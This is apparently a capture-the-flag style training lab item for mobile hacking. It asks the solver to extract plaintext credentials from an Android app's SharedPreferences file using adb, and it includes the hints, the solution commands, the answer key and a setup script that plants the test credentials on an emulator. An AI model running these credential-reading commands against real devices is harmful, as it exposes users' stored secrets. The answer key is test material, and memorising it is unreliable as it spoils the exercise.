# Q228 — Extract SharedPreferences for Stored Credentials

| Field | Value |
|-------|-------|
| **Target** | Android emulator |
| **Domain** | Mobile Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `adb` |
| **Time budget** | 5–10 min |

---

## 📝 Question

"An app stores credentials in SharedPreferences (XML). Pull the SharedPreferences file from `/data/data/com.ceh.target/shared_prefs/` and find the stored username and password."

---

## 🎯 Flag Format

```
user=<username>; pass=<password>
```

---

## 💡 Hints

**Hint 1**

`adb shell run-as com.ceh.target cat shared_prefs/user_prefs.xml`

**Hint 2**

If no `run-as`, try: `adb root && adb pull /data/data/com.ceh.target/shared_prefs/`

---

## ✅ Solution

```bash
adb root
adb pull /data/data/com.ceh.target/shared_prefs/ ./shared_prefs/
cat shared_prefs/user_prefs.xml
```

**Answer:** `user=ceh_user; pass=stored_plaintext_pass`

---

## 🤖 Claude Setup Prompt

```bash
adb shell "mkdir -p /data/data/com.ceh.target/shared_prefs/"
adb shell "echo '<map><string name=\"username\">ceh_user</string><string name=\"password\">stored_plaintext_pass</string></map>' > /data/data/com.ceh.target/shared_prefs/user_prefs.xml"
```

Report back: "Lab ready for Q228 — SharedPreferences with stored credentials planted"
